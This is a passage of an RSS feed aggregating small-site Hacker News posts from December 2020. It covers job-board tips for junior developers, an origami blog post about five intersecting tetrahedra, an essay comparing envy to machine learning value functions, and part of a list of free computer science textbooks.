<p>Now, some people may be thinking, “I’d be competing against hundreds of applicants for every job. Why on earth would they pick a junior like me?” You’re not wrong. The amount of applicants for a position posted on a job board will be high. You’ll need to be pretty picky to break through the noise. But it’s doable.&nbsp;</p>
<p>Here’s the approach that got me, and others I mentored, interviews from job boards: Refine your search so that you always have jobs to apply to, but not wide enough that there are endless pages. When I started out, I aimed to apply for three jobs a day. So my search was typically wide enough to return only a couple pages of results. I would apply to the top three most relevant to my experience. The next day, I’d apply to the remaining jobs if better positions hadn’t shown up.&nbsp;</p>
<p>Because of this, I was regularly applying to jobs I didn’t feel qualified for. Junior positions aren’t always easy to come by on these websites. Often I was throwing my hat in the ring for postings that asked for 3 - 5 years of experience, and many of these did not result in a call back. But every once in a while, I did get an interview. There are a myriad of reasons for why this worked, but the TL;DR is: Job postings are not a perfect representation of what an employer needs.</p>
<p>Why is narrowing your search helpful? Let’s demonstrate with an example. Most career switchers transition into front-end development by first learning HTML &gt; CSS &gt; JavaScript. If you search for these keywords on a job board, you’re going to get a lot of results. This is because these keywords represent generic technology used across the entire industry. It’s equivalent to searching for a restaurant and typing “sandwich” in the search input. You’re going to get endless pages of options, from fancy restaurants to diners. How many actually reflect what you want? If you’re getting four or more pages returned from your search on a single job board, your keywords are too generic. One to three is what you should aim for.</p>
<p>So how does one “refine” their search?</p>
<p>The easiest way to refine your search is by picking a niche technology as your “specialty”. Perhaps you’ve heard this advice before. Picking a library or framework to specialize in will help you stand out from the crowd. Job boards are actually a great place to discover which niches are the most viable. The niche I chose when applying was Wordpress since I had studied PHP and saw several PHP positions that involved Wordpress. This approach will likely require some additional learning, but in my opinion, focusing on a niche is the fastest path to breaking into tech as a new dev.</p>
<p>You can also refine the search based on your previous, non-tech work experience. Yep, that’s right: your previous experience as a teacher, nurse, classical musician, or whatever can help your transition into tech. Certain industries, most notably finance and healthcare, actually prefer hiring someone from within the industry over outsiders. Having insider knowledge about regulations, lingo, or processes relevant to the company is a great way to break through noise and one that you can easily promote in a cover letter and resume.&nbsp;Employers will be thrilled to see someone they can easily communicate with and spend less time training.</p>
<p>Of course, results may vary depending on the type of job board you are using. Some are more popular than others. But a job board that has less search results might have less people applying on it. The main take away here is that you don’t want to spread yourself too thin. Throwing yourself at every opportunity will leave you exhausted and defeated. Instead, narrow your focus so you can act with pin point precision.</p>

					

				</article></div>]]>
            </description>
            <link>https://getadevjob.io/post/tips-for-getting-hired-as-a-junior-dev-using-job-boards/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25572995</guid>
            <pubDate>Tue, 29 Dec 2020 18:24:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[On the fifth day of Christmas ... Five intersecting tetrahedra]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25572970">thread link</a>) | @ColinWright
<br/>
December 29, 2020 | https://alisonkiddle.co.uk/on-the-fifth-day-of-christmas-my-true-love-sent-to-me/ | <a href="https://web.archive.org/web/*/https://alisonkiddle.co.uk/on-the-fifth-day-of-christmas-my-true-love-sent-to-me/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-460">
		<!-- .entry-header -->

	
	<div>
		
<p><em>Five intersecting tetrahedra</em></p>



<p>2020 has raised many challenges, and has required incredible patience from all of us. Patience as we wait for life to get back to normal, patience as rules change suddenly and plans are cancelled at the last minute, patience with technology as we cope with frozen screens, muted microphones, and unreliable broadband. There has also been solitude – my last day in an office with colleagues was March 16th, and by the time restrictions lifted to allow co-working again, I had moved on from my job and become a full-time freelancer, so I now spend much of my time enjoying my own company. It turns out that time and patience are the two ingredients needed to make an origami model I’ve had my heart set on making for many years…</p>



<p>I first came across the <em>Five intersecting tetrahedra</em> model in “The Origami Handbook” by Rick Beech, which I bought when I was a student in around 2002 or 2003. The model was designed by Tom Hull, and you can read more about it on <a href="http://origametry.net/fit.html">his website</a>. When I first saw the model I wanted to make it but having made one tetrahedron I abandoned the attempt because my paper was too flimsy and I did not think all five would stay together. I didn’t return to the model for more than a decade.</p>



<p>The tetrahedra crossed my path again at Electromagnetic Field in 2018. Matt Parker had a harebrained scheme to create a lit-up version of five intersecting tetrahedra made out of wood, and a bunch of us helped hold bits of the framework to try to get the lines going over and under each other in the right order. This was where I first appreciated that in the model, you can pair off tetrahedra using different colours to help you; if you have a red tetrahedron and a blue one, then the point of the red goes through the base of the blue and the point of the blue goes through the base of the red. In the completed model, every face of each tetrahedron has one of the other four colours going through it. This helps with the construction, though it wasn’t enough for me to get my head round the 3D geometry. </p>



<figure><img loading="lazy" src="https://alisonkiddle.co.uk/wp-content/uploads/2019/12/EMFtet-1024x982.jpg" alt="Five intersecting tetrahedra model in a field" width="674" height="646" srcset="https://alisonkiddle.co.uk/wp-content/uploads/2019/12/EMFtet-1024x982.jpg 1024w, https://alisonkiddle.co.uk/wp-content/uploads/2019/12/EMFtet-300x288.jpg 300w, https://alisonkiddle.co.uk/wp-content/uploads/2019/12/EMFtet-768x736.jpg 768w" sizes="(max-width: 674px) 100vw, 674px"><figcaption><em>Five intersecting tetrahedra being build at EMF</em></figcaption></figure>



<p>My next encounter with FIT, as it’s known to its friends, was at <a href="https://www.talkingmathsinpublic.uk/">Talking Maths in Public 2019</a>. I was part of a collaborative effort to make the model, under the guidance of Philipp Legner, founder of the excellent Mathigon website. There are <a href="https://mathigon.org/origami/intersecting-tetrahedra">instructions on Mathigon</a> for making the FIT modules, and I’ve referred to these in making my own models. </p>



<p>I was delighted to be part of a group that successfully made the model but I was still determined to make my own some day. I thought that day might come in time for MathsJam 2019, when I gave a talk about dodecahedra. One way of understanding the five intersecting tetrahedra is by looking at the twenty vertices of a dodecahedron and partitioning them into five groups of four. I successfully created a <a href="https://www.geogebra.org/m/krkxkqus">3D GeoGebra construction</a> to help me better understand the geometry but I still couldn’t manage to put the origami model together – every time I tried I would get two tetrahedra together and part of the third and then become frustrated with which parts went over and which parts went under, and end up with battered and creased modules that were only fit for the recycling bin. MathsJam 2019 had to make do with a photo of the Talking Maths in Public model.</p>



<p>Fast forward to November 2020. I had spent a big chunk of the autumn doing origami; Fran Watson and I had put together webinars for Maths Weeks in Scotland and in England. I had also found that it was an ideal lockdown hobby – modular origami with its soothing repetitions kept me calm in a chaotic and frankly scary world. I had recently made a beautiful though complicated star from instructions on <a href="https://paolobascetta.com/">Paolo Bascetta’s website</a>, and this somehow gave me the confidence to go back to the model that had become my nemesis. If I didn’t have the patience and dexterity to do it now, then perhaps I should make my peace that I never would…</p>



<p>I cut the pieces from some A4 paper – the model is folded from 3 by 1 rectangles. Each tetrahedron is made from 6 edges, so 30 rectangles cut from 10 squares of paper are needed in all. I folded the modules gradually in spare moments until all 30 were ready to assemble. Then I put together the first two tetrahedra and got stuck again. It was the evening before Big MathsJam, and I thought to myself how lovely it would be if I could start my 2020 talk tying up the loose end from 2019. That gave me the motivation I needed. I read <a href="https://michal.kosmulski.org/origami/fit-five-intersecting-tetrahedra-assembly-tips.html">Michal Kosmulski’s</a> assembly tips, and then sat at my desk manipulating paper and comparing it with the diagrams. I got a third tetrahedron in, then a fourth, and finally, all five were together! I then proceeded to tell everyone I could think of, including Twitter! </p>



<p>So, what advice would I offer someone else who wanted to make this model?<br>Well, first of all, it’s much easier to make it once you’ve already made it! Having an actual 3D real life model to compare it to made the assembly of my second, third and fourth attempts much smoother than the first one. (Yes, I’ve got an origami problem. Yes, I’ve stopped making them now. Yes, I would make another one given half a chance.) For your first model though, it really does help to look at someone else’s diagram, so here’s a photo of one of mine with some notes that might be useful.</p>



<figure><img loading="lazy" width="768" height="1024" src="https://alisonkiddle.co.uk/wp-content/uploads/2020/12/FITassemblyhelp-768x1024.jpg" alt="" srcset="https://alisonkiddle.co.uk/wp-content/uploads/2020/12/FITassemblyhelp-768x1024.jpg 768w, https://alisonkiddle.co.uk/wp-content/uploads/2020/12/FITassemblyhelp-225x300.jpg 225w, https://alisonkiddle.co.uk/wp-content/uploads/2020/12/FITassemblyhelp-1152x1536.jpg 1152w, https://alisonkiddle.co.uk/wp-content/uploads/2020/12/FITassemblyhelp-1536x2048.jpg 1536w, https://alisonkiddle.co.uk/wp-content/uploads/2020/12/FITassemblyhelp-scaled.jpg 1920w" sizes="(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px"><figcaption>Note how the yellow point emerges through the orange face. Imagine the orange point protruding through the yellow face on the opposite side of the model.<br>Note also how the remaining three colours weave themselves around the three yellow edges, in a sort of knot.<br>Put these edges in place, and then make the visible points, and then finally turn the model round to complete the faces – I found it easier to make sense of the symmetry by building the third, fourth and fifth tetrahedra together rather than one by one.</figcaption></figure>



<p>If you’re a fan of modular origami and you have the patience to tackle a complicated model, (or the three-dimensional thinking to make it easier to visualise the assembly), I think it’s definitely worth making at least once. I made a version from shiny paper which I suspect will adorn my Christmas tree for quite a few years to come. Origami is a great tool for helping young people understand the importance of care, precision and perseverance, and while I wouldn’t necessarily teach this model in an origami workshop, I will certainly use it as an example to inspire!</p>



<figure><img loading="lazy" width="1024" height="768" src="https://alisonkiddle.co.uk/wp-content/uploads/2020/12/threesizesFIT-1024x768.jpg" alt="" srcset="https://alisonkiddle.co.uk/wp-content/uploads/2020/12/threesizesFIT-1024x768.jpg 1024w, https://alisonkiddle.co.uk/wp-content/uploads/2020/12/threesizesFIT-300x225.jpg 300w, https://alisonkiddle.co.uk/wp-content/uploads/2020/12/threesizesFIT-768x576.jpg 768w, https://alisonkiddle.co.uk/wp-content/uploads/2020/12/threesizesFIT-1536x1152.jpg 1536w, https://alisonkiddle.co.uk/wp-content/uploads/2020/12/threesizesFIT-2048x1536.jpg 2048w" sizes="(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px"></figure>
	</div><!-- .entry-content -->

	 <!-- .entry-footer -->
</article></div>]]>
            </description>
            <link>https://alisonkiddle.co.uk/on-the-fifth-day-of-christmas-my-true-love-sent-to-me/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25572970</guid>
            <pubDate>Tue, 29 Dec 2020 18:23:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Little Envy Can Be a Good Thing (In Humans and Machines)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25572965">thread link</a>) | @ber123
<br/>
December 29, 2020 | https://machineopinings.com/philosophy/a-little-envy-can-be-a-good-thing-in-humans-and-machines/ | <a href="https://web.archive.org/web/*/https://machineopinings.com/philosophy/a-little-envy-can-be-a-good-thing-in-humans-and-machines/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
		
	<main id="content" role="main">

	<div>
		<div>
						<article id="post-2358">
				<div><p>When most of us scroll through social media and inevitably <a href="https://cen.acs.org/careers/employment/Jealous-peers-stop-comparing-yourself/96/i46">compare ourselves</a> to those around us we feel <a href="https://www.psychologytoday.com/us/articles/201711/the-comparison-trap">crappier</a>, like we’re <a href="https://www.forbes.com/sites/alicegwalton/2018/11/16/new-research-shows-just-how-bad-social-media-can-be-for-mental-health/#67c5b4ee7af4">missing out</a> or <a href="https://hbr.org/2020/08/feel-like-youre-falling-behind-your-peers?">falling behind</a> in our personal lives or work.&nbsp; Not coincidentally, there’s also a growing understanding of <a href="https://bestlifeonline.com/yale-happiness-course/">well-being</a> and happiness as subjective and adaptive: your happiness largely depends on your expectations. Your expectations adapt, however, and not only to your conditions, but to the conditions of those around you.</p>
<p>You probably thought your drawing in 5th grade was just fine until you saw Linda’s. And that’s also why as people get <a href="https://www.theatlantic.com/family/archive/2018/12/rich-people-happy-money/577231/">wealthier</a> they aren’t necessarily happier – the comparisons and expectations keep changing – first you want the house, then the yacht, the island, a political office, then maybe a planet (close by). It’s easy to imagine then that for all of us being exposed to so many people’s lives exposes us to all sorts of conditions that appear in some way better than our own, setting our own expectations higher, and increasing the likelihood for unhappiness.</p>
<h3>Social Comparison</h3>
<p>There’s a lot understood about what actually matters for being happy, both with your life and in your life – social connections, time meaningfully spent, being healthy, appreciating what you have – and I completely agree with all of it. But I want to focus on the role of jealously and envy, which is often derided.</p>
<p>While social media has undoubtedly exacerbated social comparison and envy, their existence has been around for a long time:</p>
<p><em>“Whoever sang or danced best, whoever was the handsomest, the strongest, the most dexterous, or the most eloquent, came to be of most consideration; and this was the first step towards inequality…From these first distinctions arose … envy: and the fermentation caused by these new leavens ended by producing combinations fatal to innocence and happiness.”</em> –<em> Rousseau, On the Origin of the Inequality of Mankind</em></p>
<p>The natural response can be like the Stoics, to limit the exposure and stop comparing yourself to others:</p>
<p><em>“How much time he gains who does not look to see what his neighbor says or does or thinks, but only at what he does himself.” – Marcus Aurelius&nbsp;&nbsp;</em></p>
<p>But while removing yourself from the barrage of updates and comparisons is essential to focus on improving yourself, that’s likely not enough. One of the methods for well-being is to identify something you want to improve, focus on it relentlessly, and compare yourself to your previous self. Not to other people who have what you want. Even imperceptibly small daily steps compound over time to make a big difference.</p>
<p><span>But while that gives you a way how to improve, it’s less clear what you should focus on.</span></p>

<h3>Envy is as Envy does</h3>
<p><span>Envy and </span>jealousy aren’t considered good things for a good reason. They feel bad mentally and physically. They gnaw at you, and make you doubt yourself. They’re also often considered <a href="https://people.whitman.edu/~frierspr/The%20Moral%20Value%20Of%20Envy.pdf">immoral;</a> something we should be ashamed of feeling and thus hide. But they’re also normal <a href="https://en.wikipedia.org/wiki/Emotion">emotions</a> most <a href="https://www.psychalive.org/how-to-deal-with-jealousy/">have experienced</a>. Sometimes they’re unproductive and should be restrained, but they may actually be quite useful in pointing us toward what we should focus on.</p>
<p>Although we still don’t quite understand what emotions are, they’re not completely mysterious either. We’ve come to understand that our experience of anger, happiness, or envy, is the result of unconscious and biochemical reactions in our brain that while similar, are not the same for all of us. Studies have also found that emotions highlight what’s important for us to pay attention to; we remember things better for longer when there is an emotion involved. Our personal blend of culture, experiences, and genetics gives rise to different emotional reactions from different phenomena for each of us.</p>
<p>For example, for many reasons I’m not a bit envious of Beyoncé’s success, but if I was a musician, or had known her school, or wanted to be famous, I may be. More likely my jealousy is aroused from a good idea that someone had or academic paper published on a topic I’m interested in, or a previous colleague of mine getting a promotion or launching a successful product. We don’t tend to be jealous indiscriminately, but when there is some closeness or familiarity, some perceived shared trait or path that could have been followed.</p>
<p>The problem is it’s often hard to pinpoint the target of an emotion like envy; we see something, we feel something, but it takes time and introspection to figure out what the root cause really is. It may start from the visible perception of another’s achievements, but underneath there are traits, skills, or circumstances that are worthy of admiration and contributed to that achievement. When you recognize those traits you can distill them into goals, and then they serve as a direction for you to strive toward.</p>
<p><em>When envy is inevitable, it should be used as stimulus. -Bertrand Russell</em></p>
<p><a href="https://www.sbp-journal.com/index.php/sbp/article/view/5977/0">Studies</a> have also found that “benign envy can lead to risk taking and self-improving behavior”.&nbsp; The point isn’t to feel envy and have it build toward resentment. We likely won’t get exactly what we want, and it’s possible our feelings are misguided, but as Nietzsche wrote by acknowledging the target of our envy as an aspiration and embracing it we understand where we can grow to be more fulfilled. Along with other emotions, envy helps humans direct our efforts, but machines operate quite differently.</p>
<h3>Emotional Algorithms</h3>
<p>Emotions are often positioned as counter to intelligence. While intelligence has many definitions, often it is defined as the ability to learn, integrate information, and apply it to solve problem with self-awareness and conscious reasoning. While machines aren’t self-aware or conscious, we do build AI systems to solve problems that would require those traits in humans.</p>
<p>On the other hand, emotions have long been thought of as interfering with our reasoning. Many behavioral and economic theories of the recent centuries were built on the notion of a rational actor making reasoned, rational choices. Behavioral research however has shown this to be lie: human decisions are usually based on <a href="https://en.wikipedia.org/wiki/Thinking,_Fast_and_Slow">biased heuristics and emotional reactions</a>, not rational thought.</p>
<p>However, this dichotomy of emotions as separate from intelligence is itself misleading. While emotions may be unconscious and perceived as irrational, the existence of similar limbic systems, which give rise to emotions, in the brains of much more primitive animals suggests emotions are also likely a type of intelligence developed for our survival. Emotions and feelings may be biochemical algorithms suited to help us navigate the world by performing quick pattern recognition and instigating behavioral responses without taxing our limited conscious cognitive abilities.</p>
<p>Let’s consider emotions to be a set of pre-tuned algorithms that have “learned” necessary basic behaviors over millennia and passed that knowledge to you in your genetic code. Your instincts may malfunction, and you may be afraid of things you shouldn’t be, or attracted to what is harmful: we all have flaws. But that doesn’t mean you should discount them. On the contrary, by paying attention to them you can fine tune those instincts through your active, conscious efforts, and even override them.</p>
<p>Our quick, emotional response, described by Kahneman as <a href="https://en.wikipedia.org/wiki/Thinking,_Fast_and_Slow">system 1</a>, can be loosely compared to how we build AI systems using machine learning, from the bottom-up, using data to fine tune a model for specific tasks through experiential learning. The conscious, rational ability, described as system 2, can analogously be compared to rule- or logic-based AI systems built top-down, directly encoding knowledge and directions.</p>
<p>In order to build a system with machine learning, you need to specify how the system will measure its success as it’s learning. This determines what it considers valuable, and conversely, what it’s penalized for not performing well on. The algorithm will dutifully make calculations and optimize toward any predetermined value function you impose. Human emotions like envy provide us with a recognition that something of value is missing: our physical or emotional suffering can be interpreted as a sign we’re penalized for it, and if we take steps to optimize our lives toward it we may be better off. An emotional reaction provides initial motivation for doing something different than what we already are. The approach to machine learning shares some characteristics with system 1, but taking a step back to the broader view of how the two systems work together, there is no analogous recognition from the algorithm that something is missing to serve as a motivation for changing the value function. That seems to be one crucial missing piece for intelligence.</p>
<h3>An Emotional Turing Test</h3>
<p>The <a href="https://en.wikipedia.org/wiki/Turing_test">Turing Test</a> and its variants, where a machine tries to imitate a human in conversation, are considered one major benchmark for <a href="https://www.fastcompany.com/90590042/turing-test-obsolete-ai-benchmark-amazon-alexa">measuring intelligent behavior</a>. Usually the question is posed as can machines think? But at our core humans are an emotional animal. It’s much more natural for us to have irrational emotional responses, and only afterward layer on rational thinking. Maybe a more complete measure of intelligence would be based on the ability to both leverage your emotions to direct conscious thinking and learning, and ignore and override them when necessary.</p>
<p>AI systems can be trained to identify human emotions, with applications like sentiment analysis or facial recognition, but that doesn’t translate to experiencing those emotions, just recognizing them. I’m not suggesting we should translate the experience of human emotions in a machine, but would something that serves a similar role be useful? If so, what would it be?</p>
<p>What if an algorithm could recognize when the value function it’s trying to optimize wasn’t actually helping it learn what it’s trying to learn, or do what it’s trying to do, and it updated the value function on its own to perform better. Not simply choosing from a set of predetermined value …</p></div></article></div></div></main></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://machineopinings.com/philosophy/a-little-envy-can-be-a-good-thing-in-humans-and-machines/">https://machineopinings.com/philosophy/a-little-envy-can-be-a-good-thing-in-humans-and-machines/</a></em></p>]]>
            </description>
            <link>https://machineopinings.com/philosophy/a-little-envy-can-be-a-good-thing-in-humans-and-machines/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25572965</guid>
            <pubDate>Tue, 29 Dec 2020 18:22:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Computer Science textbooks that are freely available online]]>
            </title>
            <description>
<![CDATA[
Score 488 | Comments 44 (<a href="https://news.ycombinator.com/item?id=25572852">thread link</a>) | @MrXOR
<br/>
December 29, 2020 | https://csgordon.github.io/books.html | <a href="https://web.archive.org/web/*/https://csgordon.github.io/books.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>




<div>


    

<p>Below is a loosely-categorized collection of links to CS textbooks in a variety of areas that are
freely available online, usually because they are one of the following:</p>

<ul>
  <li>An open textbook (such as PLAI, SF, or the HoTT book)</li>
  <li>An older book that is out of print, for which the copyright has returned to the original author(s)
(such as TTFP)</li>
  <li>An author’s own preprint or draft of a textbook.  This includes cases where the author has made
special arrangements with a publisher to host an electronic copy of a published text on their
homepage while it remains in print.</li>
</ul>

<p>Most of these I’ve only used for brief personal reference, and have not read in depth.  The exceptions, those books I’ve spent considerable time with and highly recommend, are marked with asterisks.</p>

<p>I also include below a list of papers I consider good stand-alone introductions to certain topics, and a list of links to thorough special topics courses.</p>

<p>If you find one of the links below is broken or has moved, feel free to let me know.</p>

<p>Those with time to spare and looking to have less of it may enjoy browsing the QA call numbers in <a href="http://onlinebooks.library.upenn.edu/">UPenn’s extensive listing of online books</a>.  Most of those listed here were found independently over the years, but I’ve just now (June 2020) learned of this excellent repository of links.  I’ll add to the links below as I find promising books.</p>

<h2 id="programming-language-theory--program-analysis-including-automata">Programming Language Theory &amp; Program Analysis (including Automata)</h2>
<p>Topics such as semantics, types, abstract interpretation, proof assistants…</p>

<ul>
  <li><a href="http://www.cis.upenn.edu/~bcpierce/sf/">Software Foundations</a></li>
  <li><a href="http://www.cs.cmu.edu/~rwh/plbook/">Practical Foundations for Programming Languages (draft)</a></li>
  <li><a href="http://www.cse.chalmers.se/research/group/logic/book/">Programming in Martin-Lof’s Type Theory</a></li>
  <li><a href="http://www.paultaylor.eu/stable/Proofs+Types.html">Proofs and Types</a></li>
  <li><a href="http://www.paultaylor.eu/~pt/prafm/">Practical Foundations of Mathematics</a></li>
  <li>*<a href="http://www.cs.brown.edu/~sk/Publications/Books/ProgLangs/">Programming Languages: Application and Interpretation</a>
  (second edition <a href="http://www.cs.brown.edu/courses/cs173/2012/book/">in progress</a>)</li>
  <li><a href="http://www.daimi.au.dk/~bra8130/Wiley_book/wiley.html">Semantics with Applications</a></li>
  <li><a href="http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.17.7385">Lectures on the Curry Howard Isomorphism (draft)</a></li>
  <li>*<a href="http://www.cs.kent.ac.uk/people/staff/sjt/TTFP/">Type Theory and Functional Programming</a></li>
  <li>*<a href="http://adam.chlipala.net/cpdt/">Certified Programming with Dependent Types</a></li>
  <li><a href="http://www21.in.tum.de/~nipkow/LNCS2283/">Isabelle/HOL: A Proof Assistant for Higher-Order Logic</a></li>
  <li><a href="http://www.usingcsp.com/">Communicating Sequential Processes</a></li>
  <li><a href="http://www.cs.cmu.edu/~jcr/craftprog.html">The Craft of Programming</a></li>
  <li><a href="http://people.cis.ksu.edu/~schmidt/text/densem.html">Denotational Semantics: A Methodology for Language Development</a></li>
  <li>*<a href="http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.26.4391">Lambda Calculi with Types</a></li>
  <li><a href="http://www.cs.ru.nl/~henk/book.pdf">Lambda Calculus with Types</a></li>
  <li><a href="http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.56.7045">Logics and Type Systems</a></li>
  <li><a href="http://www.cs.ox.ac.uk/publications/books/PfS/">Programming from Specifications</a></li>
  <li><a href="http://www.usingz.com/">Using Z: Specification, Refinement, and Proof</a></li>
  <li><a href="http://homotopytypetheory.org/book/">Homotopy Type Theory</a></li>
  <li><a href="http://www.itu.dk/~sestoft/pebook/">Partial Evaluation and Automatic Program Generation</a></li>
  <li><a href="http://www.nuprl.org/book/">Implementing Mathematics with The Nuprl Proof Development System</a></li>
  <li><a href="http://intuitionistic.files.wordpress.com/2010/07/martin-lof-tt.pdf">Intuitionistic Type Theory</a></li>
  <li><a href="http://www21.in.tum.de/~nipkow/Concrete-Semantics">Concrete Semantics</a></li>
  <li><a href="http://www602.math.ryukoku.ac.jp/~nakano/papers/index.html">PX: A Comuptational Logic</a></li>
  <li><a href="http://research.microsoft.com/en-us/um/people/lamport/tla/book.html">Specifying Systems: The TLA+ Language and Tools for Hardware and Software Engineers</a></li>
  <li>*<a href="http://cristal.inria.fr/attapl/">The Essence of ML Type Inference</a> 
  (Manuscript, Chapter 10 of <a href="http://www.cis.upenn.edu/~bcpierce/attapl/index.html">ATTAPL</a>)</li>
  <li><a href="http://cs.au.dk/~amoeller/spa/">Static Program Analysis</a></li>
  <li><a href="http://pl.cs.jhu.edu/pl/book/index.shtml">Principles of Programming Languages</a></li>
  <li><a href="https://manu.sridharan.net/files/aliasAnalysisChapter.pdf">Alias Analysis for Object-Oriented Programs”</a> 
  (Manuscript, chapter of <emph>Aliasing in Object-Oriented Programming</emph>)</li>
  <li><a href="https://yanniss.github.io/points-to-tutorial15.pdf">Pointer Analysis</a></li>
  <li><a href="http://tata.gforge.inria.fr/">Tree Automata Techniques and Applications</a></li>
  <li><a href="http://www.wisdom.weizmann.ac.il/~harel/reactive_systems.html">Modeling Reactive Systems with Statecharts: The STATEMATE Approach</a></li>
  <li>*<a href="https://www.cs.princeton.edu/~appel/papers/plcc.pdf">Program Logics for Certified Compilers</a></li>
  <li><a href="http://www.lix.polytechnique.fr/Labo/Samuel.Mimram/teaching/INF551/course.pdf">Program = Proof</a></li>
  <li><a href="https://www.cambridge.org/core/books/foundations-of-probabilistic-programming/819623B1B5B33836476618AC0621F0EE">Foundations of Probabilistic Programming</a></li>
</ul>

<h2 id="mathematical-logic-set-theory-model-theory-topology">Mathematical Logic, Set Theory, Model Theory, Topology</h2>

<p>This portion excludes category theory, which is now its own section below.</p>

<ul>
  <li><a href="http://tellerprimer.ucdavis.edu/">A Modern Formal Logic Primer</a></li>
  <li><a href="http://people.cohums.ohio-state.edu/tennant9/Natural_Logic.pdf">Natural Logic</a> (pdf)</li>
  <li><a href="http://www.math.cornell.edu/~hatcher/AT/ATpage.html">Algebraic Topology</a></li>
  <li><a href="http://www.math.uchicago.edu/~may/BOOKSMaster.html">A Concise Course in Algebraic Topology</a></li>
  <li><a href="http://www.math.toronto.edu/weiss/model_theory.html">Model Theory</a></li>
  <li><a href="http://www.math.toronto.edu/weiss/set_theory.html">Set Theory</a></li>
  <li><a href="http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.183.8564">An Introduction to Substructural Logics</a></li>
  <li><a href="http://homepages.mcs.vuw.ac.nz/~rob/papers/modalhist.pdf">Mathematical Modal Logic: A View of its Evolution</a></li>
  <li><a href="http://standish.stanford.edu/bin/detail?fileID=1705616123X">Normalization, Cut-Elimination, and the Theory of Proofs</a></li>
  <li><a href="http://standish.stanford.edu/bin/detail?fileID=1111907143">Logics of Time and Computation</a></li>
  <li><a href="http://standish.stanford.edu/bin/detail?fileID=1114665926">Mathematics of Modality</a></li>
  <li><a href="http://standish.stanford.edu/bin/detail?fileID=1766806333X">Modal Logic and Process Algebra: A Bisimulation Perspective</a></li>
  <li><a href="http://standish.stanford.edu/bin/detail?fileID=1791546586X">Lectures on Linear Logic</a></li>
  <li><a href="http://standish.stanford.edu/bin/detail?fileID=1710712960X">Dynamics, Polarity, and Quantification</a></li>
  <li><a href="http://standish.stanford.edu/bin/detail?fileID=1821513720X">Non-Well-Founded Sets</a></li>
  <li><a href="http://www.logicinaction.org/">Logic in Action</a></li>
  <li><a href="http://www1.chapman.edu/~jipsen/JipsenRoseVoL.html">Varieties of Lattices</a></li>
  <li><a href="http://wwwhomes.uni-bielefeld.de/mkracht/html/tools/index.html">Tools and Techniques in Modal Logic</a> (the page is in German; the download link is the actual PDF)</li>
  <li>*<a href="https://math.berkeley.edu/~gbergman/245/">An Invitation to General Algebra and Universal Constructions</a></li>
  <li><a href="https://www.math.uchicago.edu/~may/BOOKSMaster.html">A Concise Course in Algebraic Topology</a> (near the bottom)</li>
  <li><a href="https://library.oapen.org/handle/20.500.12657/35301">Logic and Automata: History and Perspectives</a></li>
  <li><a href="https://topology.pubpub.org/">Topology: A Categorical Approach</a></li>
</ul>

<h2 id="software-engineering-theory-and-practice">Software Engineering (Theory and Practice)</h2>

<ul>
  <li><a href="https://landing.google.com/sre/sre-book/toc/index.html">Site Reliability Engineering</a></li>
  <li><a href="https://landing.google.com/sre/workbook/toc/">The Site Reliability Workbook</a></li>
  <li>The Architecture of Open Source Applications project books:
    <ul>
      <li><a href="https://www.aosabook.org/en/index.html">The Architecture of Open Source Applications</a></li>
      <li><a href="https://www.aosabook.org/en/index.html">The Architecture of Open Source Applications, Vol. 2</a></li>
      <li><a href="https://www.aosabook.org/en/index.html">The Performance of Open Source Applications</a></li>
      <li><a href="https://www.aosabook.org/en/index.html">500 Lines or Less</a></li>
    </ul>
  </li>
  <li><a href="https://sttp.site/">Software Testing: From Theory to Practice</a> (NOTE: Often does not load for me)</li>
</ul>

<h2 id="category-theory-and-applications">Category Theory and Applications</h2>

<ul>
  <li><a href="http://www.tac.mta.ca/tac/reprints/articles/17/tr17abs.html">Abstract and Concrete Categories: The Joy of Cats</a></li>
  <li><a href="http://www.cs.man.ac.uk/~david/categories/">Computational Category Theory</a></li>
  <li><a href="http://www.tac.mta.ca/tac/reprints/articles/12/tr12abs.html">Toposes, Triples, and Theories</a></li>
  <li>*<a href="http://ebooks.library.cornell.edu/cgi/t/text/text-idx?c=math;idno=gold010">Topoi: The Categorical Analysis of Logic</a>
  (<a href="http://projecteuclid.org/euclid.bia/1403013939#toc">also at Project Euclid</a>)</li>
  <li><a href="http://www.di.ens.fr/users/longo/download.html">Categories, Types, and Structures</a></li>
  <li><a href="http://arxiv.org/abs/math/0305049/">Higher Operads, Higher Categories</a></li>
  <li><a href="ftp://ftp.math.mcgill.ca/barr/pdffiles/ctcs.pdf">Category Theory for Computing Science</a> [pdf]
  (<a href="ftp://ftp.math.mcgill.ca/barr/pdffiles/Index.html">Barr’s publications</a>)</li>
  <li><a href="http://www.math.mcgill.ca/barr/papers/sac.pdf">*-Autonomous Categories</a></li>
  <li><a href="http://www.cl.cam.ac.uk/~amp12/papers/catl/catl.pdf">Categorical Logic</a></li>
  <li><a href="http://www.tac.mta.ca/tac/reprints/articles/3/tr3abs.html">Abelian Categories</a></li>
  <li><a href="http://www.tac.mta.ca/tac/reprints/articles/1/tr1abs.html">Metric Spaces, Generalized Logic, and Closed Categories</a></li>
  <li><a href="http://www.lfcs.inf.ed.ac.uk/reports/92/ECS-LFCS-92-208/">An introduction to fibrations, topos theory, the effective topos and modest sets</a></li>
  <li><a href="http://www.math.harvard.edu/~eriehl/cathtpy.pdf">Categorical Homotopy Theory</a></li>
